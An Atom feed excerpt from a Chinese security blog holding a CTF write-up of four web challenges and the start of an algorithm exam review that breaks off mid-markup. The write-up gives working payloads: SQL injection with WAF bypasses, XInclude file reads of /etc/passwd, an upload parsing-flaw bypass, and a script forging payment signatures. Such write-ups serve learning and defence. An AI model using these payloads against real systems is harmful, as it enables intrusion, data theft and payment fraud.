<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2018-11-08T14:04:40.774Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安恒10月赛Web题目复现</title>
    <link href="0verwatch.top/2018/11/08/anheng-10month/"/>
    <id>0verwatch.top/2018/11/08/anheng-10month/</id>
    <published>2018-11-08T12:46:41.000Z</published>
    <updated>2018-11-08T14:04:40.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好<a id="more"></a>，质量还是有保证的，学到很多东西</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy audit"></a>easy audit</h3><p>这个题目确实有点脑洞。。运用了两个php函数一个是<code>get_defined_functions</code>这个函数是用于返回所有已定义函数的数组，而另外一个则是<code>get_defined_vars</code> 这个函数是返回由所有已定义变量所组成的数组<br>可以查看此网址:<a href="https://www.jb51.net/article/42890.htm" target="_blank" rel="noopener">https://www.jb51.net/article/42890.htm</a></p><p>右键查看源代码发现存在<code>index.php?func1</code>，那么这个参数究竟有什么作用可以先尝试一下，上手就来一个phpinfo，发现直接有回显<br><a href="https://imgchr.com/i/iH0hd0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png" alt="iH0hd0.md.png"></a><br>猜测是直接运行函数之类的功能,然后运用get_defined_functions 获得全局的函数这里面的函数有内置的也有开发人员自己定义的函数，可以发现最后的这一个函数特别显眼，调用一下这个函数发现有源码出来<br><a href="https://imgchr.com/i/iH0TWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0TWF.md.png" alt="iH0TWF.md.png"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include 'real_flag.php';</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jam_source_ctf_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jam_flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])?$_GET[<span class="string">'a'</span>]:<span class="string">'123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_str</span><span class="params">($m=<span class="number">6</span>)</span></span>&#123;</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line">        $str_list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$m;$i++)&#123;</span><br><span class="line">            $str .= $str_list[rand(<span class="number">0</span>,strlen($str_list)<span class="number">-1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GiveYouTheFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">        $secret = <span class="keyword">$this</span>-&gt;gen_str();</span><br><span class="line">        <span class="comment">//echo $secret;</span></span><br><span class="line">        <span class="keyword">if</span>($secret === <span class="keyword">$this</span>-&gt;a)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $real_flag;<span class="comment">//echo $flag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'want to use me?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GiveYouTheFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand().<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$_flag = <span class="keyword">new</span> jam_flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]) &amp;&amp; $_POST[<span class="string">'flag'</span>] === <span class="string">'I want the flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">    $_flag-&gt;GiveYouTheFlag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这段代码大致的意思就是新建了一个类，然后调用类里面的函数把flag给输出来<br>这里我们用到<code>get_defined_vars</code>这个函数，单独使用是不能输出flag的，可能到这里会存在疑问输出flag的函数应该还得满足<code>$secret === $this-&gt;a</code>而这个secret又是随机生成的，那要怎么办，其实不需要，这里的flag是属于<code>real_flag.php</code>里面的只要我们把页面包含进来我们就可以把该页面所有变量值都给打印出来了，所以关键点还得满足这个条件<br><code>isset($_POST[&#39;flag&#39;]) &amp;&amp; $_POST[&#39;flag&#39;] === &#39;I want the flag&#39;</code><br>即可包含real_flag.php，这应该是出题人故意留的不然也输出不了flag，23333<br><a href="https://imgchr.com/i/iHBiyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBiyd.md.png" alt="iHBiyd.md.png"></a><br>发包得到flag<br><a href="https://imgchr.com/i/iHBAeI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBAeI.md.png" alt="iHBAeI.md.png"></a></p><h3 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h3><p>这个题目进去之后要登录，右键查看源代码找找http头部啥的发现里面有一个password，直接复制提交就可以登陆上去，登陆以后是一个upload页面<br><img src="https://s1.ax1x.com/2018/11/08/iHBMlQ.png" alt="iHBMlQ.png"><br><img src="https://s1.ax1x.com/2018/11/08/iHBlOs.png" alt="iHBlOs.png"></p><p>然后尝试上传一个小马，发现不行，然后尝试改一下后缀发现这应该是黑名单过滤的，因为尝试了<code>php2,php3.php4</code>都可以上传，但是却不能解析把他们都当做文本解析了<br><a href="https://imgchr.com/i/iHBapF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBapF.md.png" alt="iHBapF.md.png"></a><br>但是可以发现服务器版本是<code>Apache/2.4.6</code>，这里可能存在解析漏洞，把后缀名改为Apache不认识的就可以了<br><a href="https://imgchr.com/i/iHBw6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBw6J.md.png" alt="iHBw6J.md.png"></a><br><a href="https://imgchr.com/i/iHB7AP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHB7AP.md.png" alt="iHB7AP.md.png"></a><br>flag直接在上层目录flag{698539765730b69026796420b9201e03}</p><h2 id="CoolCms"><a href="#CoolCms" class="headerlink" title="CoolCms"></a>CoolCms</h2><p>原来这个题一叶飘零学长出的额2333<br>这个网站两个地方可能存在漏洞一个就是<code>article.php</code>页面存在SQL注入，因为这里面id参数暴露了出来，另外就是在<code>write.php</code>页面上可能存在xxe文件读取<br>现在可能存在的注入页面输入3的时候就会出现<code>table flag????</code>，再fuzz测试一下发现<code>or，update，delete，</code>以及逗号等符号都被过滤了<br><a href="https://imgchr.com/i/iHBL9S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBL9S.md.png" alt="iHBL9S.md.png"></a></p><p>本来就是飘零学长出的题目就去参考他的博客呀<br><a href="http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/" target="_blank" rel="noopener">http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/</a><br><a href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/" target="_blank" rel="noopener">http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/</a></p><p>我们可以从fuzz的结果发现这里面的<code>union</code>还有<code>select</code>都可以单独使用但一旦他们两个一起使用的时候，就会被waf掉，猜测后台写的正则是这样写的<code>|union select|</code>，我们就可以使用<code>%0b</code>将其绕过，也就是<code>union%0bselect</code><br>但是逗号又被过滤了，这个时候就可以用<code>join</code>去绕过<br><img src="https://s1.ax1x.com/2018/11/08/iHDk3F.png" alt="iHDk3F.png"><br>用<code>join</code>实现同样的效果<br><a href="https://imgchr.com/i/iHDAc4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDAc4.md.png" alt="iHDAc4.md.png"></a></p><p><code>or</code>被过滤了，<code>information_schema</code>没法使用，虽然题目这里提示了我们表名为flag，但是字段名却无从知晓，这时候就可以利用联合填充来代替掉字段名和表名<br><img src="https://s1.ax1x.com/2018/11/08/iHDmH1.png" alt="iHDmH1.png"></p><p><a href="https://imgchr.com/i/iHDtHI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDtHI.md.png" alt="iHDtHI.md.png"></a><br>可以发现现在字段名变成了1,2,3，所以要查找里面的内容可以用用下面的语句<br><code>select * from users where id=-1 union select 1,(select i.2 from (select 1,2,3 union select * from users)i limit 1,1),3;</code><br><a href="https://imgchr.com/i/iHDd4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDd4f.md.png" alt="iHDd4f.md.png"></a></p><p>这样即可无需字段名来查找数据，然后通过limit语句一条条查即可，这里是因为逗号被过滤了所以我们用offset来替代<br>因此先测试一下哪一列有回显<br><code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select 4)l--+</code>发现第二列跟第四列有回显<br><a href="https://imgchr.com/i/iHD0C8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD0C8.md.png" alt="iHD0C8.md.png"></a></p><p>接着直接用上面的套路读出flag的路径<code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select i.4 from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)i limit 1 offset 1)l-- k</code><br>得到路径是<code>/home/fff123aggg</code><br><a href="https://imgchr.com/i/iHD2Eq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD2Eq.md.png" alt="iHD2Eq.md.png"></a><br>开始用xxe读取文件，先试一下<code>/etc/passwd</code>,成功回显<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iHDW5V" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDW5V.md.png" alt="iHDW5V.md.png"></a><br>然后读取flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/fff123aggg"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到flag{316f87681354a715d6134c4b8166aa73}</p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>这个题是个代码审计的题目，先把源码给down下来<br>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要<code>888</code>积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。<br>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是<code>16</code>，这个东西后期有用，而且他有<code>30000</code>积分，够买很多flag了，<br><a href="https://imgchr.com/i/iHDqV1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDqV1.md.png" alt="iHDqV1.md.png"></a><br><img src="https://s1.ax1x.com/2018/11/08/iHrJRU.png" alt="iHrJRU.png"></p><p>这里面学到了该如何审计python的代码，感觉跟php套路一样，还是得先去看一下设置文件对应就是这里面的<code>setting</code>文件，<br><a href="https://imgchr.com/i/iHrYzF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrYzF.md.png" alt="iHrYzF.md.png"></a><br>发现里面有一个空的<code>real flag</code>只是出题人把他给删掉了，这里面的重要信息就是这个secret.key是用于构造签名的<br>其实这个<code>secret.key</code>已经给了的，也存在于源码里面<br><a href="https://imgchr.com/i/iHrUsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrUsJ.md.png" alt="iHrUsJ.md.png"></a><br>然后重点看<code>urls.py.</code>以及<code>views.py</code>,如果<code>views.py</code>不存在<code>urls.py</code>里面的函数说明是调用了框架自身调用的函数，对于这个题而言没必要去查看框架本身的代码<br>这段代码在注册方面本身是没有任何问题的，所以得看其他方面<br>再查看shop里面的<code>urls.py</code>以及<code>views.py</code>可以发现里面存在购买对于身份的验证操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payOrder</span><span class="params">(request, orderid)</span>:</span></span><br><span class="line">o = get_object_or_404(Order, id=orderid, user=request.user, status=Order.ONGOING)</span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: o.id,</span><br><span class="line"><span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line"><span class="string">'good_id'</span>: o.good.id,</span><br><span class="line"><span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line"><span class="string">'good_price'</span>: o.good.price,</span><br><span class="line"><span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="comment">#print(sign)</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure></p><p>这段代码最后是跳到<code>payment</code>的路由下，我们可以继续追踪一下，发现<code>payment</code>下就一个<code>check</code>函数，关键的函数就在<code>views.py</code>里面，这里对交易做了详细的校验<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPayment</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment"># print(request.body)</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'未知错误'</span>, <span class="string">'status'</span>: <span class="string">'danger'</span>&#125;</span><br><span class="line">sign = request.GET.get(<span class="string">'signature'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> md5(RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + request.body).hexdigest() == sign:</span><br><span class="line">o = get_object_or_404(Order, id=request.POST.get(<span class="string">'order_id'</span>))</span><br><span class="line">g = get_object_or_404(Good, id=request.POST.get(<span class="string">'good_id'</span>))</span><br><span class="line">u = get_object_or_404(User, id=request.POST.get(<span class="string">'buyer_id'</span>))</span><br><span class="line"><span class="comment"># 检查订单是否为待支付状态</span></span><br><span class="line"><span class="keyword">if</span> o.status != Order.ONGOING:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 状态异常，可能已完成或已取消'</span></span><br><span class="line"><span class="comment"># 检查商品是否可购买</span></span><br><span class="line"><span class="keyword">elif</span> g.available != <span class="keyword">True</span> <span class="keyword">or</span> g.amount &lt;= <span class="number">0</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'商品 <span class="subst">&#123;g.id&#125;</span> 暂时不可购买，可能库存不足'</span></span><br><span class="line"><span class="comment"># 检查用户可用积分是否足够</span></span><br><span class="line"><span class="keyword">elif</span> u.profile.point &lt; g.price:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'用户 <span class="subst">&#123;u.username&#125;</span> 可用积分不足，无法完成支付'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> u.is_staff != <span class="keyword">True</span>:</span><br><span class="line">u.profile.point -= g.price</span><br><span class="line">u.save()</span><br><span class="line">g.amount -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> g.name == <span class="string">'FLAG'</span>:</span><br><span class="line">o.message = REAL_FLAG</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">o.message = <span class="string">f'fake_flag<span class="subst">&#123;&#123;&#123;md5(urandom(<span class="number">32</span>)).hexdigest()&#125;</span>&#125;&#125;&lt;br&gt;(购买“FLAG”才能获得真正的 flag)'</span></span><br><span class="line"><span class="keyword">if</span> g.amount &lt;= randint(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">g.amount += randint(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line">g.save()</span><br><span class="line">o.status = Order.FINISHED</span><br><span class="line">o.save()</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 支付成功！'</span></span><br><span class="line">ret[<span class="string">'status'</span>] = <span class="string">'success'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">'签名不正确，数据可能被篡改！'</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/result.html'</span>, ret)</span><br></pre></td></tr></table></figure></p><p>商品从三方面进行了校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.检查订单是否为待支付状态</span><br><span class="line">2.检查商品是否可购买</span><br><span class="line">3.检查用户可用积分是否足够</span><br></pre></td></tr></table></figure></p><p>但是这三方面只是单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p><p>根据它里面的代码去构造signature就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'148'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,   <span class="comment">#admin账号id，从数据库得知</span></span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   <span class="comment"># 商品id也可从数据库得知</span></span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'250'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1541706305.953427'</span> <span class="comment">#时间戳支付订单上有</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure></p><p>得到签名之后抓支付的包修改对应参数发包即可<br><a href="https://imgchr.com/i/iHraL9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHraL9.md.png" alt="iHraL9.md.png"></a><br>得到flag<br><a href="https://imgchr.com/i/iHr6zD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHr6zD.md.png" alt="iHr6zD.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次月赛学到了几个点总结一下，第一就是学到PHP几个偏门小函数，第二就是一叶飘零学长出的题目的一波SQL注入的骚操作以及xxe文件读取的操作，第三就是执念于心学长出的逻辑漏洞的代码审计，如何去审计Django框架的代码，怎么去发现无双向检验的logic漏洞，复习去了2333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>算法上机考试复习</title>
    <link href="0verwatch.top/2018/11/08/algorithm-review/"/>
    <id>0verwatch.top/2018/11/08/algorithm-review/</id>
    <published>2018-11-08T12:00:35.000Z</published>
    <updated>2018-11-08T14:06:09.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要上机考试，因此还是对以前做过的题目做一个复习回顾，自己重新手写一遍，纯属回顾，代码风格不好请海涵，考完试以后我把考了的点都标记了一下方便以后学弟学妹们复习了<a id="more"></a>，2333</p><h2 id="迭代递归"><a href="#迭代递归" class="headerlink" title="迭代递归"></a>迭代递归</h2><h3 id="汽水瓶-考试考了类似的"><a href="#汽水瓶-考试考了类似的" class="headerlink" title="汽水瓶(考试考了类似的)"></a>汽水瓶(考试考了类似的)</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</p><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p>输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</p><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</p><h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> )<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">a = n/<span class="number">3</span>;</span><br><span class="line">b = n%<span class="number">3</span>;</span><br><span class="line">result += a;</span><br><span class="line">n = a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( n ==<span class="number">2</span>) result += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 